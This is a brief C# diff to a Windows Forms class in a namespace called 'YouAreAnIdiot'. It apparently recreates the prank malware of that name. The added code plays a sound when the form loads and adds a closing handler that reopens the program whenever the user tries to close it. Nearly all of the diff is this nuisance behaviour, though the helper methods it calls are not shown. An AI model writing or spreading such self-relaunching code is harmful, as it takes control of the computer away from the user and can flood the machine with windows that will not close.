@@ -5,6 +5,12 @@ namespace YouAreAnIdiot
         public Form1()
         {
             InitializeComponent();
+            Program.PlaySound();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Program.OpenItself();
         }
     }
 }
